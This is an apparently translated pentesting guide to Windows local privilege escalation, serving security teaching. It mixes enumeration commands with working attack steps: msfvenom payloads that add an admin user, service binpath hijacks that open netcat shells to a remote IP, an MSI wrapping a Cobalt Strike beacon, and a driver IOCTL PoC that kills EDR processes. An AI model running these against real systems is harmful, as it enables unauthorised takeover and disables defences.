# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **查找 Windows local privilege escalation vectors 的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### 访问令牌

**如果你不知道 Windows 访问令牌是什么，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 完整性级别

**如果你不知道 Windows 中的完整性级别是什么，应在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows 中存在各种机制，可能会阻止你枚举系统、运行可执行文件或甚至检测到你的活动。在开始 privilege escalation 枚举之前，你应该阅读以下页面并枚举所有这些防御机制：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### 版本信息枚举

检查 Windows 版本是否存在已知漏洞（同时检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### 版本漏洞利用

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **巨大攻击面** that a Windows environment presents.

**在系统上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas 已嵌入 watson)_

**本地（含系统信息）**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

Github repos of exploits:

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 环境

是否有任何 credential/Juicy info 保存在 env variables 中？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell 转录文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 学习如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell 管道执行的详细信息会被记录，涵盖已执行的命令、命令调用以及脚本的部分内容。然而，完整的执行细节和输出结果可能不会被捕获。

要启用此功能，请按照文档中 "Transcript files" 部分的说明操作，选择 **"Module Logging"** 而不是 **"Powershell Transcription"**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看来自 PowersShell 日志的最近 15 条事件，您可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

捕获脚本执行的完整活动与全部内容记录，确保每个代码块在运行时都被记录。该过程保留了每项活动的全面审计轨迹，对于取证和分析恶意行为非常有价值。通过在执行时记录所有活动，可以获得对该过程的详细洞察。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows 事件查看器的路径：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
要查看最近 20 条事件，你可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 互联网设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，则可能会导致系统被妥协。

你可以先在 cmd 中运行以下命令来检查网络是否使用非 SSL 的 WSUS 更新：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中执行以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到类似以下的回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 或 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 等于 `1`。

那么，**it is exploitable.** 如果最后那个注册表值等于 0，则 WSUS 条目会被忽略。

为了利用此漏洞，你可以使用类似的工具： [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) — 这些是 MiTM 武器化利用脚本，用于向非 SSL 的 WSUS 流量注入“伪造”更新。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本上，这就是该漏洞利用的缺陷：

> 如果我们可以修改本地用户代理（local user proxy），并且 Windows Updates 使用 Internet Explorer 设置中配置的代理，那么我们就可以在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus) 来拦截自己的流量，并在资产上以提升的用户权限运行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也会使用当前用户的证书存储。如果我们为 WSUS 主机名生成一个自签名证书并将其添加到当前用户的证书存储中，就能够拦截 HTTP 和 HTTPS 的 WSUS 流量。WSUS 没有使用类似 HSTS 的机制来对证书实施 trust-on-first-use 类型的验证。如果呈现的证书被用户信任并具有正确的主机名，服务就会接受该证书。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 来利用此漏洞（当它发布时）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

许多企业 agent 会暴露本地的 localhost IPC 接口和一个特权更新通道。如果可以将 enrollment 强制到攻击者服务器，且 updater 信任一个恶意的 root CA 或签名校验薄弱，那么本地用户可以提交一个恶意 MSI，由 SYSTEM 服务安装。参见基于 Netskope stAgentSvc 链（CVE-2025-0309）的通用技术：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

在 Windows **domain** 环境中存在一个 **local privilege escalation** 漏洞，需满足特定条件。这些条件包括：**LDAP signing is not enforced，** 用户拥有允许其配置 **Resource-Based Constrained Delegation (RBCD)** 的自身权限，以及用户能够在域内创建计算机。重要的是，这些 **requirements** 在 **default settings** 下是成立的。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

关于攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**如果** 这两个注册表项被 **启用**（值为 **0x1**），那么任何权限的用户都可以以 NT AUTHORITY\\**SYSTEM** 的身份 **安装**（执行） `*.msi` 文件。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
如果你有一个 meterpreter 会话，你可以使用模块 **`exploit/windows/local/always_install_elevated`** 来自动化此技术

### PowerUP

使用 power-up 的 `Write-UserAddMSI` 命令在当前目录中创建一个 Windows MSI 二进制文件以提升权限。这个脚本会写出一个预编译的 MSI 安装程序，提示添加用户/组（所以你将需要 GIU access）：
```
Write-UserAddMSI
```
只需执行生成的二进制文件即可提升权限。

### MSI Wrapper

阅读本教程以了解如何使用这些工具创建 MSI wrapper。注意，如果你**只是**想要**执行****命令行**，可以包装一个 **.bat** 文件。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- 使用 Cobalt Strike 或 Metasploit **生成** 一个新的 **Windows EXE TCP payload** 到 `C:\privesc\beacon.exe`
- 打开 **Visual Studio**，选择 **Create a new project**，在搜索框中输入 "installer"。选择 **Setup Wizard** 项目并点击 **Next**。
- 为项目命名，比如 **AlwaysPrivesc**，将位置设为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 持续点击 **Next** 直到到达第 3 步（共 4 步）（选择要包含的文件）。点击 **Add** 并选择刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中选中 **AlwaysPrivesc** 项目，在 **Properties** 中将 **TargetPlatform** 从 **x86** 更改为 **x64**。
- 你还可以更改其他属性，例如 **Author** 和 **Manufacturer**，以使已安装的应用看起来更合法。
- 右键点击项目，选择 **View > Custom Actions**。
- 右键 **Install** 并选择 **Add Custom Action**。
- 双击 **Application Folder**，选择你的 **beacon.exe** 文件并点击 **OK**。这将确保安装程序运行时立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 改为 **True**。
- 最后，**构建它**。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确保将平台设置为 x64。

### MSI Installation

要在**后台**执行恶意 `.msi` 文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要 exploit 此漏洞，你可以使用： _exploit/windows/local/always_install_elevated_

## 杀毒软件与检测器

### 审计设置

这些设置决定了哪些内容会被**记录**，因此你应该注意。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，值得了解日志被发送到哪里
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 的设计目的是用于 **管理本地 Administrator 密码**，确保加入域的计算机上的每个密码都是 **唯一、随机化并定期更新**。这些密码被安全地存储在 Active Directory 中，仅能被通过 ACLs 授予足够权限的用户访问，从而在被授权时查看 local admin 密码。

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果启用，**明文密码会存储在 LSASS** (Local Security Authority Subsystem Service).\
[**关于 WDigest 的更多信息**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 开始，Microsoft 引入了对 Local Security Authority (LSA) 的增强保护，以 **阻止** 不受信任的进程尝试 **读取其内存** 或注入代码，进一步提升系统安全。\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 在 **Windows 10** 中引入。它的目的是保护存储在设备上的凭据，抵御诸如 pass-the-hash 攻击等威胁。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**域凭据** 由 **本地安全机构** (LSA) 验证并被操作系统组件使用。当用户的登录数据由已注册的安全包进行认证时，通常会为该用户建立域凭据。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户与组

### 枚举用户与组

你应该检查你所属的任何组是否具有有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某些特权组，你可能能够提升权限**。在这里了解特权组以及如何滥用它们来提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**了解更多** 关于什么是 **token** 的内容请见此页面：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
查看以下页面以**了解有趣的 tokens**以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主目录
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 运行中的进程

### 文件和文件夹权限

首先，列出进程时，**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖某个正在运行的 binary**，或者是否对 binary 文件夹具有写权限，以便利用可能的 [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否可能有 [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

你可以使用 **procdump**（来自 sysinternals）对正在运行的进程创建内存转储。像 FTP 这样的服务在内存中通常会有 **credentials in clear text in memory**，尝试转储内存并读取这些 credentials。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用

**以 SYSTEM 身份运行的应用可能允许用户启动 CMD，或浏览目录。**

Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## 服务

Service Triggers 允许 Windows 在某些条件发生时启动服务（named pipe/RPC endpoint 活动、ETW 事件、IP 可用性、设备到达、GPO 刷新等）。即使没有 SERVICE_START 权限，你通常也可以通过触发它们的 triggers 来启动受限权限的服务。有关枚举和激活技术，请参见：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 获取服务信息
```bash
sc qc <service_name>
```
建议获取来自 _Sysinternals_ 的二进制文件 **accesschk**，以检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查 "Authenticated Users" 是否可以修改任何服务:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[你可以在这里下载适用于 XP 的 accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到此错误（例如针对 SSDPSRV）：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

你可以使用以下命令启用它
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖于 SSDPSRV 才能运行（适用于 XP SP1）**

**另一个解决方法** 是运行：
```
sc.exe config usosvc start= auto
```
### **修改服务二进制路径**

在 “Authenticated users” 组对某个服务拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该服务的可执行二进制文件。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
可以通过以下权限进行提权:

- **SERVICE_CHANGE_CONFIG**: Allows reconfiguration of the service binary.
- **WRITE_DAC**: Enables permission reconfiguration, leading to the ability to change service configurations.
- **WRITE_OWNER**: Permits ownership acquisition and permission reconfiguration.
- **GENERIC_WRITE**: Inherits the ability to change service configurations.
- **GENERIC_ALL**: Also inherits the ability to change service configurations.

检测和利用此漏洞时，可使用 _exploit/windows/local/service_permissions_。

### 服务二进制文件弱权限

**检查是否可以修改由服务执行的二进制文件** 或者是否对二进制所在的文件夹具有 **write permissions on the folder** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
你可以使用 **wmic** (not in system32) 获取由服务执行的所有二进制，然后使用 **icacls** 检查你的权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以**检查**你在某个服务**注册表**上的**权限**，方法如下：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，服务执行的二进制文件可以被修改。

要更改服务执行的二进制文件的 Path：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 服务注册表 AppendData/AddSubdirectory 权限

如果你对某个注册表拥有此权限，这意味着**你可以从该注册表创建子注册表**。在 Windows services 的情况下，这**足以执行任意代码：**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果可执行文件的路径没有被引号包围，Windows 会尝试执行路径中每个空格之前的部分。

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有 unquoted service paths，排除属于内置 Windows 服务的：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以检测并利用** 此漏洞使用 metasploit: `exploit/windows/local/trusted\_service\_path` 你可以手动用 metasploit 创建一个 service binary:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要采取的操作。此功能可以配置为指向一个 binary。如果该 binary 可被替换，则可能发生 privilege escalation。更多细节请参见[官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)。

## 应用

### 已安装的应用程序

检查 **permissions of the binaries** (maybe you can overwrite one and escalate privileges) 以及 **文件夹**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 写入权限

检查是否可以修改某个 config file 来读取某些特殊文件，或是否可以修改将由 Administrator 帐户执行的某个 binary（schedtasks）。

在系统中查找弱的 folder/files permissions 的一种方法是执行：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 启动时运行

**检查是否能够覆盖将由其他用户执行的 registry 或 binary。**\
**阅读** **以下页面** 以了解有关有趣的 **autoruns locations to escalate privileges** 的更多信息：


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 驱动程序

查找可能的 **third party weird/vulnerable** 驱动程序
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
如果驱动暴露了任意内核读/写原语（常见于设计不良的 IOCTL 处理程序），你可以通过直接从内核内存窃取 SYSTEM token 来升级权限。详细的逐步技术见：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

对于那些易受竞态条件影响并导致可控 Object Manager 路径被打开的漏洞，故意放慢查找（使用最大长度的组件或深层目录链）可以将时间窗口从微秒级拉长到数十微秒：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

现代 hive 漏洞允许你整理可确定的布局，滥用可写的 HKLM/HKU 子项，并将元数据损坏转化为内核 paged-pool 溢出，而无需自定义驱动。完整链条见：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 滥用在 设备对象 上缺失的 FILE_DEVICE_SECURE_OPEN（LPE + EDR kill）

一些已签名的第三方驱动通过 IoCreateDeviceSecure 使用强 SDDL 创建其设备对象，但忘记在 DeviceCharacteristics 中设置 FILE_DEVICE_SECURE_OPEN。没有该标志，当通过包含额外组件的路径打开设备时，安全 DACL 不会被强制执行，这使得任何无特权的用户可以通过使用类似于下列名称空间路径来获取句柄：

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

一旦用户能够打开该设备，驱动暴露的特权 IOCTLs 可以被滥用于 LPE 和篡改。野外观测到的示例能力包括：
- 向任意进程返回完全访问句柄（通过 DuplicateTokenEx/CreateProcessAsUser 窃取 token / 获取 SYSTEM shell）。
- 不受限制的原始磁盘读/写（离线篡改、引导时持久化技巧）。
- 终止任意进程，包括 Protected Process/Light (PP/PPL)，允许从用户态通过内核终止 AV/EDR。

最小 PoC 模式（用户态）：
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
针对开发人员的缓解措施
- 在创建打算通过 DACL 受限的设备对象时，始终设置 FILE_DEVICE_SECURE_OPEN。
- 验证调用者上下文以执行特权操作。在允许进程终止或返回句柄之前，添加 PP/PPL 检查。
- 限制 IOCTLs（访问掩码、METHOD_*、输入验证），并考虑使用 brokered 模型而不是直接的 kernel privileges。

针对防御者的检测思路
- 监控对可疑设备名的 user-mode 打开（例如 \\ .\\amsdk*）以及表明滥用的特定 IOCTL 序列。
- 强制实施 Microsoft 的 vulnerable driver blocklist（HVCI/WDAC/Smart App Control），并维护自己的允许/拒绝列表。


## PATH DLL Hijacking

如果你在 PATH 中的某个文件夹拥有 **写入权限**，你可能能够劫持被进程加载的 DLL 并 **escalate privileges**。

检查 PATH 中所有文件夹的权限：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
有关如何滥用此检查的更多信息：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
